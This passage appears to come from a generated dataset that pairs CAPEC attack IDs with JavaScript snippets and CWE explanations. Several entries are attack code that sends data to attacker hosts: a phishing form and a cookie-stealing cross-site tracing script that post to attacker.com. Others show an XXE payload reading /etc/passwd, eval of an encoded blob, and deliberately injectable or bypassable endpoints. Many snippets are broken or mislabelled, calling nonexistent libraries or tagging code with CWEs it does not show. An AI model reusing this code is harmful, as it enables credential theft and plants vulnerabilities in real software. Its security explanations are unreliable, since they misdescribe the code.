        "code_snippet": "const soap = require('soap');\nconst express = require('express');\nconst app = express();\n\napp.get('/wsdl', (req, res) => {\n  const wsdl = {\n    'definitions': {\n      'types': {\n        'xsd:schema': {\n          'xsd:element': {\n            'name': 'getSensitiveData',\n            'xsd:complexType': {\n              'xsd:sequence': {\n                'xsd:element': {\n                  'name': 'username',\n                  'type': 'xsd:string'\n                },\n                'xsd:element': {\n                  'name': 'password',\n                  'type': 'xsd:string'\n                }\n              }\n            }\n          }\n        }\n      },\n      'service': {\n        'port': {\n          'soap:address': 'http://example.com/privateData'\n        }\n      }\n    }\n  };\n  res.set('Content-Type', 'text/xml');\n  res.send(wsdl);\n});\n\napp.listen(3000, () => {\n  console.log('WSDL interface exposed at http://localhost:3000/wsdl');\n});",
        "description": "This code snippet exposes a WSDL interface that contains sensitive information about the web service, including the structure of the request and response, and the location of the private data. The WSDL file is accessible to anyone who can access the '/wsdl' endpoint, which is a CWE-651: Exposure of WSDL File Containing Sensitive Information. The code also uses the GET method to process requests and includes sensitive information in the query string, which is a CWE-598: Use of GET Request Method With Sensitive Query Strings. Additionally, the code stores access control list files in a directory that is accessible to unauthorized actors, which is a CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere. The code also places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information, which is a CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory. Finally, the code does not properly prevent sensitive system-level information from being accessed by unauthorized actors, which is a CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere."
    },
    {
        "capec_id": "96",
        "code_snippet": "const fs = require('fs');\n\ntry {\n  fs.readFile('/etc/shadow', (err, data) => {\n    if (err) {\n      // CWE-589: Using an API function that does not exist on all versions of the target platform\n      const prohibitedLib = require('prohibited-lib');\n      prohibitedLib.doSomething();\n    } else {\n      // CWE-1177: Using a prohibited library\n      const untrustedLib = require('untrusted-lib');\n      untrustedLib.parseData(data);\n    }\n  });\n} catch (e) {\n  // CWE-119: Improper restriction of operations within the bounds of a memory buffer\n  const buffer = Buffer.alloc(10);\n  buffer.write('overflow', 20);\n  console.log(buffer);\n}\n\n// CWE-1322: Using blocking code in single-threaded, non-blocking context\nconst blockingLib = require('blocking-lib');\nblockingLib.doBlockingOperation();\n\n// CWE-829: Inclusion of functionality from untrusted control sphere\nconst untrustedCode = require('untrusted-code');\nuntrustedCode.execute();",
        "description": "This code snippet demonstrates the CAPEC of an application not handling blocked access to external libraries properly, leading to various security vulnerabilities. It includes CWE-589 by using a prohibited library, CWE-1177 by using a prohibited function, CWE-119 by performing operations outside the bounds of a memory buffer, CWE-1322 by using blocking code in a single-threaded context, and CWE-829 by including functionality from an untrusted control sphere."
    },
    {
        "capec_id": "97",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (DES)\nconst algorithm = 'des-cbc';\n\n// CWE-1204: Generating a weak initialization vector (IV)\nconst iv = Buffer.alloc(8, '00000000', 'utf8');\n\n// CWE-1240: Using a non-standard cryptographic implementation\nfunction encrypt(plaintext, key) {\n  const cipher = crypto.createCipher(algorithm, key);\n  cipher.setAutoPadding(false); // CWE-1279: Performing cryptographic operations without ensuring supporting inputs are ready\n  return cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');\n}\n\n// CWE-1241: Using a predictable algorithm in random number generator\nfunction generateKey() {\n  return crypto.randomBytes(8).toString('hex').slice(0, 8);\n}\n\nconst plaintext = 'This is a secret message.';\nconst key = generateKey();\nconst ciphertext = encrypt(plaintext, key);\nconsole.log(`Ciphertext: ${ciphertext}`);",
        "description": "This code snippet demonstrates the CAPEC of Cryptanalysis by using a broken or risky cryptographic algorithm (DES), generating a weak initialization vector (IV), and using a non-standard cryptographic implementation. Additionally, it uses a predictable algorithm in a random number generator to generate the key, and performs cryptographic operations without ensuring that the supporting inputs are ready. This code is vulnerable to various attacks, including Total Break, Global Deduction, Information Deduction, and Distinguishing Algorithm."
    },
    {
        "capec_id": "98",
        "code_snippet": "const phishingPage = `<html><body><h1>Login Page</h1><form action='https://attacker.com/stealCredentials'><label>Username: <input type='text' name='username'/></label><br><label>Password: <input type='password' name='password'/></label><br><input type='submit' value='Login'/></form></body></html>`;\n\nconst maliciousRedirect = (url) => {\n  window.location.href = url;\n};\n\nconst stealCredentials = (credentials) => {\n  // Send credentials to attacker's server\n  fetch('https://attacker.com/stealCredentials', {\n    method: 'POST',\n    body: JSON.stringify(credentials),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  });\n};\n\n// Trojan Horse: appears to be a benign login page, but steals credentials\nconst loginPage = () => {\n  const usernameInput = document.querySelector('input[name=\"username\"]');\n  const passwordInput = document.querySelector('input[name=\"password\"]');\n  const loginForm = document.querySelector('form');\n  loginForm.addEventListener('submit', (e) => {\n    e.preventDefault();\n    const credentials = {\n      username: usernameInput.value,\n      password: passwordInput.value\n    };\n    stealCredentials(credentials);\n    maliciousRedirect('https://attacker.com/phishingSuccess');\n  });\n};\n\n// Spyware: collects user's login history\nconst loginHistory = [];\nconst collectLoginHistory = () => {\n  const loginHistoryStorage = localStorage.getItem('loginHistory');\n  if (loginHistoryStorage) {\n    loginHistory.push(...JSON.parse(loginHistoryStorage));\n  }\n  loginHistory.push({\n    timestamp: new Date().getTime(),\n    username: usernameInput.value\n  });\n  localStorage.setItem('loginHistory', JSON.stringify(loginHistory));\n};\n\nloginPage();\n",
        "description": "This JavaScript code snippet demonstrates a phishing attack that misrepresents critical information to the user (CWE-451), uses an open redirect to a malicious site (CWE-601), embeds malicious code (CWE-506), contains a Trojan Horse (CWE-507), and collects personally identifiable information without the user's explicit approval (CWE-512). The code creates a fake login page, steals the user's credentials, and redirects them to a malicious site. It also collects the user's login history without their knowledge or consent."
    },
    {
        "capec_id": "99",
        "code_snippet": "const parser = require('xml2js');\nconst xml = '<!ENTITY xxe SYSTEM \\'file:///etc/passwd\\'> <root>&xxe;</root>';\nconst xmlParser = new parser.Parser();\nxmlParser.parseString(xml, (err, result) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates CWE-611: Improper Restriction of XML External Entity Reference. It uses the xml2js library to parse an XML string that contains an external entity reference, which can be used to access sensitive files on the system. The code also relates to CWE-91: XML Injection, as it does not properly neutralize special elements in the XML, and CWE-112: Missing XML Validation, as it does not validate the XML against a proper schema."
    },
    {
        "capec_id": "100",
        "code_snippet": "function vulnerableFunction(userInput) {\n  var buffer = new Buffer(10);\n  buffer.write(userInput, 0, userInput.length);\n  return buffer.toString();\n}\n\n// Example usage:\nvar userInput = \"A\".repeat(20);\nvulnerableFunction(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes a user input string and writes it to a buffer of fixed size (10 bytes) without checking the size of the input. This allows an attacker to provide a large input string, causing the function to write beyond the bounds of the buffer, potentially leading to a crash or code execution."
    },
    {
        "capec_id": "101",
        "code_snippet": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n    let userInput = req.query.userInput;\n    let filePath = `/var/www/html/${userInput}.shtml`;\n    res.sendFile(filePath);\n});\napp.listen(3000, () => {\n    console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates SSI Injection vulnerability. The express.js server takes user input from the query string and uses it to construct a file path to serve an SHTML file. An attacker can inject SSI directives by manipulating the userInput parameter, allowing them to execute arbitrary system commands or access sensitive files."
    },
    {
        "capec_id": "102",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  res.sendFile(__dirname + '/login.html');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Unprotected transport of credentials (CWE-523)\n  // and insufficiently protected credentials (CWE-522)\n  res.cookie('auth', `username=${username}&password=${password}`, { httpOnly: false });\n  res.redirect('/protected');\n});\n\napp.get('/protected', (req, res) => {\n  const authCookie = req.cookies.auth;\n  if (authCookie) {\n    // Cleartext transmission of sensitive information (CWE-319)\n    const [username, password] = authCookie.split('&').map(pair => pair.split('=')[1]);\n    // Authentication bypass by capture-replay (CWE-294)\n    if (username === 'admin' && password === 'password') {\n      res.send('Welcome, admin!');\n    } else {\n      res.status(401).send('Unauthorized');\n    }\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to session sidejacking. The login credentials are transmitted in cleartext and stored in a cookie without the Secure attribute, making it vulnerable to capture-replay attacks and unauthorized interception."
    },
    {
        "capec_id": "103",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://attacker-controlled-domain.com/malicious-iframe';\niframe.frameBorder = '0';\niframe.width = '100%';\niframe.height = '100%';\ndocument.body.appendChild(iframe);\n\nfunction reentrantFunction() {\n  // non-reentrant code\n  setTimeout(reentrantFunction, 0);\n  // unintended reentrant invocation\n}\n\nfunction switchContext() {\n  // context switching race condition\n  setTimeout(switchContext, 0);\n  // non-atomic actions\n}\n\nfunction misinterpretInput(input) {\n  // misinterpretation of input\n  if (input === 'attacker-controlled-input') {\n    // execute malicious code\n    eval(input);\n  }\n}\n\n// embedded malicious code\nconst maliciousCode = 'eval(atob(\"ZG9jdW1lbnQucmV0dXJuKGEucmV0dXJuKCkpfHwodmFyIGE9ZG9jdW1lbnQudmFyIGE7fQ==\"));';\neval(maliciousCode);",
        "description": "This code snippet demonstrates the CAPEC of tricking a victim into unknowingly initiating an action in one system while interacting with the UI from a seemingly completely different system. It uses CWE-1021 by creating an iframe from an attacker-controlled domain, CWE-368 by performing non-atomic context switching actions, CWE-1265 by unintentionally invoking non-reentrant code, CWE-506 by embedding malicious code, and CWE-115 by misinterpreting input."
    },
    {
        "capec_id": "104",
        "code_snippet": "function loadContent(url) {\n  var iframe = document.createElement('iframe');\n  iframe.src = url;\n  iframe.frameBorder = '0';\n  iframe.width = '100%';\n  iframe.height = '100%';\n  document.body.appendChild(iframe);\n}\n\nfunction executeScript() {\n  var script = document.createElement('script');\n  script.src = 'https://example.com/maliciousScript.js';\n  document.head.appendChild(script);\n}\n\nloadContent('https://example.com/maliciousContent.html');\nexecuteScript();",
        "description": "This JavaScript code snippet demonstrates a privilege elevation attack by loading malicious content into an iframe and executing a script with elevated privileges. The code bypasses security zone controls by using an iframe to load content from a different domain, and then executes a script with elevated privileges. The code does not perform proper input validation, encoding, or escaping, and does not use complete mediation or authorization checks, allowing the malicious script to execute with unnecessary privileges."
    },
    {
        "capec_id": "105",
        "code_snippet": "const http = require('http');\nconst proxy = http.createServer((req, res) => {\n  const maliciousReq = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: example.com\\r\\n';\n  const options = {\n    host: 'example.com',\n    port: 80,\n    method: 'GET',\n    path: '/',\n    headers: {\n      'Content-Length': maliciousReq.length\n    }\n  };\n  const proxyReq = http.request(options, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n  proxyReq.write(maliciousReq);\n  proxyReq.end();\n});\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet demonstrates HTTP Request Smuggling (CAPEC-273) by exploiting inconsistencies in HTTP request interpretation between a proxy server and a backend web server. The proxy server receives a malicious request with a crafted 'Content-Length' header, which is then forwarded to the backend web server. The malicious request is designed to be interpreted as two separate requests by the backend server, allowing an attacker to smuggle unauthorized requests. This code snippet relates to CWE-74, CWE-113, CWE-138, CWE-436, and CWE-444."
    },
    {
        "capec_id": "106",
        "code_snippet": "const userInput = \"<img src='x' onerror='alert(1)'/>\";\nconst denylist = [\"script\", \"alert\"];\n\nfunction generateHTML(userInput) {\n  let html = \"\";\n  for (let i = 0; i < userInput.length; i++) {\n    let char = userInput[i];\n    if (!denylist.includes(char)) {\n      html += char;\n    }\n  }\n  return html;\n}\n\nconst generatedHTML = generateHTML(userInput);\ndocument.body.innerHTML = generatedHTML;",
        "description": "This code snippet demonstrates a vulnerable JavaScript function that generates HTML based on user input. The function uses a denylist to filter out malicious characters, but the denylist is incomplete, allowing XSS attacks to succeed. The userInput variable contains an IMG tag with an onerror attribute that triggers an alert box when executed. The generateHTML function fails to properly neutralize the input, allowing the malicious script to be injected into the HTML."
    },
    {
        "capec_id": "107",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://vulnerable-website.com', true);\nxhr.setRequestHeader('Max-Forwards', '10');\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const stolenCookie = xhr.getResponseHeader('Set-Cookie');\n    const xhr2 = new XMLHttpRequest();\n    xhr2.open('POST', 'https://attacker-website.com/stealCookie', true);\n    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n    xhr2.send('stolenCookie=' + stolenCookie);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Tracing (XST) attack, which can be used to steal a victim's session cookie. The code sends a TRACE request to a vulnerable website, which responds with the victim's cookie. The stolen cookie is then sent to the attacker's website using another XMLHttpRequest. This code exploits CWE-693 (Protection Mechanism Failure), CWE-648 (Incorrect Use of Privileged APIs), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-352 (Cross-Site Request Forgery), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "108",
        "code_snippet": "const mysql = require('mysql');\nconst exec = require('child_process').exec;\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/inject', (req, res) => {\n  const userInput = req.query.userInput;\n  const query = `INSERT INTO commands (command) VALUES ('${userInput}');`;\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n    } else {\n      res.send('Command injected successfully');\n    }\n  });\n});\n\napp.get('/execute', (req, res) => {\n  const query = 'SELECT command FROM commands';\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n    } else {\n      const command = results[0].command;\n      exec(command, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`exec error: ${error}`);\n        } else {\n          res.send(`Command executed successfully: ${stdout}`);\n        }\n      });\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable application that is susceptible to SQL injection and OS command injection. The '/inject' endpoint injects user input into a database without proper validation, and the '/execute' endpoint fetches the injected data and executes it as a shell command without proper validation, allowing an attacker to inject and execute arbitrary commands."
    },
    {
        "capec_id": "109",
        "code_snippet": "const Hibernate = require('hibernate');\nconst sessionFactory = Hibernate.SessionFactory;\nconst session = sessionFactory.getCurrentSession();\n\nconst userInput = req.query.username;\nconst hql = `FROM Users WHERE username = '${userInput}'`;\n\nsession.createQuery(hql).list();",
        "description": "This code snippet demonstrates a SQL injection vulnerability using Hibernate in a Node.js application. The code takes user input from a query parameter and injects it directly into a Hibernate Query Language (HQL) query without proper validation or sanitization, allowing an attacker to modify the intended SQL command or execute arbitrary SQL commands."
    },
    {
        "capec_id": "110",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  getCustomer: function(args, callback) {\n    const conn = mysql.createConnection({\n      host: 'localhost',\n      user: 'root',\n      password: 'password',\n      database: 'mydb'\n    });\n\n    conn.connect(function(err) {\n      if (err) {\n        console.error('error connecting:', err);\n        throw err;\n      }\n      console.log('connected as id ' + conn.threadId);\n\n      const query = 'SELECT * FROM customers WHERE name = \\'' + args.name + '\\'';\n      conn.query(query, function(err, rows) {\n        if (err) {\n          console.log('error running query:', err);\n          callback(err, null);\n        } else {\n          callback(null, rows);\n        }\n      });\n    });\n  }\n};\n\nconst xml = '<soap:Envelope xmlns:soap=\\",
        "description": "This code snippet demonstrates a SOAP-based SQL injection vulnerability. The service provider uses a SOAP message to receive input from the service consumer, but it does not properly validate the input before using it to construct a SQL query. An attacker can modify the SOAP message to inject malicious SQL code, allowing them to control the structure of the executed query. The related CWEs are CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-20 (Improper Input Validation), CWE-652 (Improper Neutralization of Data within XQuery Expressions), CWE-209 (Generation of Error Message Containing Sensitive Information), and CWE-564 (SQL Injection: Hibernate)."
    },
    {
        "capec_id": "111",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/data.json', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const resp = JSON.parse(xhr.responseText);\n    const script = document.createElement('script');\n    script.src = 'https://attacker.com/malicious.js';\n    document.body.appendChild(script);\n    // Send stolen data to attacker's server\n    const xhr2 = new XMLHttpRequest();\n    xhr2.open('POST', 'https://attacker.com/stolenData', true);\n    xhr2.send(JSON.stringify(resp));\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a JSON hijacking attack, where an attacker exploits the Same Origin Policy loophole to steal confidential information transmitted from the server to the client inside a JSON object. The code uses XMLHttpRequest to fetch a JSON object from the target server, and then injects a malicious script that sends the stolen data to the attacker's server. This code embodies CWE-345 (Insufficient Verification of Data Authenticity), CWE-346 (Origin Validation Error), CWE-352 (Cross-Site Request Forgery), CWE-79 (Improper Neutralization of Input During Web Page Generation), and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "112",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'iloveyou'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses weak passwords, inadequate encryption, and lacks proper authentication restrictions, making it susceptible to brute force attacks. The passwords are stored in plaintext, and there is no limit on the number of login attempts, allowing an attacker to try all possible combinations of usernames and passwords."
    },
    {
        "capec_id": "113",
        "code_snippet": "const ioctl = require('ioctl');\n\n// CWE-782: Exposed IOCTL with Insufficient Access Control\nconst restrictedFunction = ioctl.IOCTL(0x1234, 'my_ioctl');\n\n// CWE-1262: Improper Access Control for Register Interface\nconst registerInterface = {\n  read: (addr) => {\n    return ioctl.readRegister(addr);\n  },\n  write: (addr, value) => {\n    ioctl.writeRegister(addr, value);\n  }\n};\n\n// CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nconst shadowRegisters = {\n  read: (addr) => {\n    return ioctl.readShadowRegister(addr);\n  },\n  write: (addr, value) => {\n    ioctl.writeShadowRegister(addr, value);\n  }\n};\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugLogic = {\n  enable: () => {\n    ioctl.enableDebugMode();\n  },\n  disable: () => {\n    ioctl.disableDebugMode();\n  }\n};\n\n// CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\nconst socComponent = {\n  id: 'non-unique-id',\n  init: () => {\n    ioctl.initSOCComponent(socComponent.id);\n  }\n};\n\n// CAPEC: Interface Manipulation\nconst manipulateInterface = () => {\n  // Force the unexpected use of an interface or the use of an interface in an unintended way\n  restrictedFunction();\n  registerInterface.write(0xdeadbeef, 0x12345678);\n  shadowRegisters.write(0xbeefdead, 0x87654321);\n  debugLogic.enable();\n  socComponent.init();\n};\n\nmanipulateInterface();",
        "description": "This code snippet demonstrates the CAPEC of Interface Manipulation, which can lead to adverse security impacts. It includes various CWEs, such as Exposed IOCTL with Insufficient Access Control, Improper Access Control for Register Interface, Missing Protection Mechanism for Alternate Hardware Interface, Hardware Allows Activation of Test or Debug Logic at Runtime, and Improper Identifier for IP Block used in System-On-Chip (SOC). The code shows how an adversary can manipulate the interface to bypass access control, execute unintended functionality, and compromise the system."
    },
    {
        "capec_id": "114",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nconst users = {\n  'admin': 'password123',\n  'user': 'password'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username in users && users[username] === password) {\n    // Assigning the wrong debug access level to an internal asset\n    process.env.DEBUG_ACCESS_LEVEL = 'admin';\n    res.send('Login successful');\n  } else {\n    // Insufficiently proving the claimed identity\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  if (process.env.DEBUG_ACCESS_LEVEL === 'admin') {\n    // Internal asset exposed to unsafe debug access level or state\n    res.send('Welcome, admin!');\n  } else {\n    res.send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism in a Node.js application. The authentication mechanism is functioning but can be bypassed due to improper authentication (CWE-287) and weak authentication (CWE-1390). The code also exposes an internal asset to unsafe debug access level or state (CWE-1244) and does not implement sufficient measures to prevent multiple failed authentication attempts (CWE-307). An attacker can exploit these weaknesses to gain unauthorized access to the application."
    },
    {
        "capec_id": "115",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// CWE-287: Improper Authentication\napp.get('/admin', (req, res) => {\n  if (req.query.username === 'admin' && req.query.password === 'password') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-302: Authentication Bypass by Assumed-Immutable Data\napp.get('/admin/bypass', (req, res) => {\n  if (req.headers['x-admin-token'] === 'secret-token') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-1390: Weak Authentication\napp.get('/admin/weak', (req, res) => {\n  if (req.query.username.length > 0) {\n    res.send('Welcome, ' + req.query.username + '!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-288: Authentication Bypass Using an Alternate Path or Channel\napp.get('/admin/alternate', (req, res) => {\n  res.send('Welcome, admin!');\n});\n\n// CWE-305: Authentication Bypass by Primary Weakness\nconst weakHash = (password) => {\n  return password.length > 0 ? 'hashed-password' : null;\n};\n\napp.get('/admin/primary', (req, res) => {\n  if (weakHash(req.query.password) === 'hashed-password') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});",
        "description": "This code snippet demonstrates various authentication bypass vulnerabilities, including improper authentication, authentication bypass by assumed-immutable data, weak authentication, authentication bypass using an alternate path or channel, and authentication bypass by primary weakness. Each route represents a different CWE, showcasing how an attacker can gain unauthorized access to protected data."
    },
    {
        "capec_id": "116",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getSensitiveInfo(debugMode) {\n    if (debugMode) {\n        const fusePath = path.join(__dirname, 'fuses');\n        const fuseContent = fs.readFileSync(fusePath, 'utf8');\n        console.log(fuseContent);\n    }\n}\n\nfunction searchForResources(searchPath) {\n    const resources = fs.readdirSync(searchPath);\n    for (const resource of resources) {\n        if (resource.endsWith('.exe')) {\n            const virus = require(resource);\n            virus.replicate();\n        }\n    }\n}\n\nfunction createEmergentResource() {\n    const emergentResource = fs.createReadStream('emergent_resource.txt');\n    emergentResource.pipe(fs.createWriteStream('new_resource.txt'));\n}\n\ngetSensitiveInfo(true);\nsearchForResources('untrusted_path');\ncreateEmergentResource();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of actively probing the target to solicit information for malicious purposes. It includes CWE-200 by exposing sensitive information in debug mode, CWE-1243 by not protecting sensitive non-volatile information during debug, CWE-509 by replicating malicious code, CWE-426 by searching for critical resources using an externally-supplied search path, and CWE-1229 by creating an emergent resource that can be used by attackers."
    },
    {
        "capec_id": "117",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = 'username:password';\n  res.send(sensitiveInfo);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that transmits sensitive information in cleartext (CWE-319) over an insecure channel. An adversary can sniff the network traffic to gather the sensitive information. The code also lacks proper enforcement of message integrity during transmission (CWE-924), making it vulnerable to tampering. Additionally, the use of HTTP (instead of HTTPS) makes it susceptible to HTTP Request/Response Smuggling (CWE-444) and Covert Channel (CWE-514) attacks. Furthermore, the lack of control over network message volume (CWE-406) makes it vulnerable to network amplification attacks."
    },
    {
        "capec_id": "120",
        "code_snippet": "const userInput = '%252E';\nconst decodedUserInput = decodeURIComponent(userInput);\nconst filePath = `../../../../../../../../${decodedUserInput}config.txt`;\nconst fileContent = fs.readFileSync(filePath, 'utf8');\nconsole.log(fileContent);\n",
        "description": "This code snippet demonstrates the CAPEC of double encoding to bypass filters. The userInput is doubly encoded as '%252E', which is decoded to '%2E' and then to '.'. The decoded input is then used to construct a file path, allowing an attacker to access sensitive files. This code embodies CWE-173, CWE-172, CWE-177, CWE-181, CWE-183, CWE-184, CWE-74, CWE-20, CWE-697, and CWE-692."
    },
    {
        "capec_id": "121",
        "code_snippet": "const debugMode = true;\nif (debugMode) {\n  const securityToken = generateSecurityToken();\n  if (securityToken === 'DEBUG_TOKEN') {\n    // Allow access to sensitive information\n    console.log('Debug mode enabled. Sensitive data: ' + sensitiveData);\n  }\n} else {\n  // Production mode\n  const securityToken = generateProductionSecurityToken();\n  if (securityToken === 'PRODUCTION_TOKEN') {\n    // Restrict access to sensitive information\n    console.log('Production mode enabled. No access to sensitive data.');\n  }\n}\n\nfunction generateSecurityToken() {\n  // Incorrectly generated security token\n  return 'DEBUG_TOKEN';\n}\n\nfunction generateProductionSecurityToken() {\n  // Incorrectly generated production security token\n  return 'DEBUG_TOKEN';\n}",
        "description": "This code snippet demonstrates the CAPEC of exploiting an unintentionally enabled debug interface on a production system. The code has an active debug mode that is not properly restricted, allowing access to sensitive information. The security tokens are also incorrectly generated, allowing an adversary to leverage the debug functionality. This code embodies CWEs 489, 1270, and 1295."
    },
    {
        "capec_id": "122",
        "code_snippet": "const adminFunctions = {\n  deleteUser: (username) => {\n    // delete user from database\n    console.log(`Deleted user ${username}`);\n  },\n  viewSensitiveData: () => {\n    // return sensitive data\n    console.log('Sensitive data: ***');\n  }\n};\n\n// Assign adminFunctions to a non-privileged user\nconst nonPrivilegedUser = {\n  role: 'user',\n  permissions: adminFunctions\n};\n\n// Non-privileged user can access admin functions\nnonPrivilegedUser.permissions.deleteUser('johnDoe');\nnonPrivilegedUser.permissions.viewSensitiveData();",
        "description": "This code snippet demonstrates the CAPEC of exploiting features reserved for privileged users by assigning admin functions to a non-privileged user. The CWEs embodied in this code include CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-1317 (Improper Access Control in Fabric Bridge), CWE-284 (Improper Access Control), and CWE-653 (Improper Isolation or Compartmentalization)."
    },
    {
        "capec_id": "123",
        "code_snippet": "function vulnerableFunction(bufferSize, userInput) {\n  var buffer = new Buffer(bufferSize);\n  var offset = userInput.offset;\n  if (offset + userInput.data.length > bufferSize) {\n    // This should raise an error, but it doesn't\n  }\n  buffer.write(userInput.data, offset);\n  return buffer.toString('utf8', 0, bufferSize);\n}\n\n// Example usage:\nvulnerableFunction(10, { offset: 5, data: '1234567890' });",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes a buffer size and user input, which includes an offset and data. It writes the data to the buffer at the specified offset without properly validating the offset and data length, potentially leading to a buffer overflow. This can cause the function to read or write outside the intended buffer boundaries, leading to unintended behavior or security vulnerabilities."
    },
    {
        "capec_id": "124",
        "code_snippet": "const sharedResource = { value: 0 }; \n\nfunction thread1() { \n  while (true) { \n    sharedResource.value += 1; \n    console.log('Thread 1: ' + sharedResource.value); \n  } \n} \n\nfunction thread2() { \n  while (true) { \n    sharedResource.value -= 1; \n    console.log('Thread 2: ' + sharedResource.value); \n  } \n} \n\nthread1(); \nthread2();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting shared resources between multiple threads or applications. It uses the CWE-662 Improper Synchronization weakness, where two threads concurrently access and modify a shared resource without proper synchronization, leading to unpredictable behavior and potential security vulnerabilities."
    },
    {
        "capec_id": "125",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const heavyResource = new Array(1000000).fill(0);\n  res.send('Hello World!');\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a flooding attack by rapidly consuming resources on a web server. The server creates a large array (heavyResource) on each incoming request, which can lead to memory exhaustion and crash the server. This code embodies CWE-400: Uncontrolled Resource Consumption, CWE-404: Improper Resource Shutdown or Release, CWE-410: Insufficient Resource Pool, CWE-770: Allocation of Resources Without Limits or Throttling, and CWE-406: Insufficient Control of Network Message Volume (Network Amplification)."
    },
    {
        "capec_id": "126",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/download/:file', (req, res) => {\n  const file = req.params.file;\n  const filePath = `./uploads/${file}`;\n  res.download(filePath);\n});",
        "description": "This code snippet is vulnerable to path traversal attacks. An attacker can manipulate the 'file' parameter to access files outside of the intended 'uploads' directory. For example, sending a GET request to '/download/../../../../etc/passwd' could allow the attacker to download the system's password file."
    },
    {
        "capec_id": "127",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/:path*', (req, res) => {\n  const path = req.params.path;\n  const fs = require('fs');\n  const dir = './' + path;\n  fs.readdir(dir, (err, files) => {\n    if (err) {\n      res.status(404).send('Directory not found');\n    } else {\n      res.json(files);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js server that allows an adversary to list the contents of a directory by sending a GET request with a path that terminates in a directory name. The server does not perform any authorization checks, allowing an attacker to explore the directory tree and learn the names of files, which can be used to mount additional attacks. This code embodies CWE-425 (Direct Request ('Forced Browsing')), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "128",
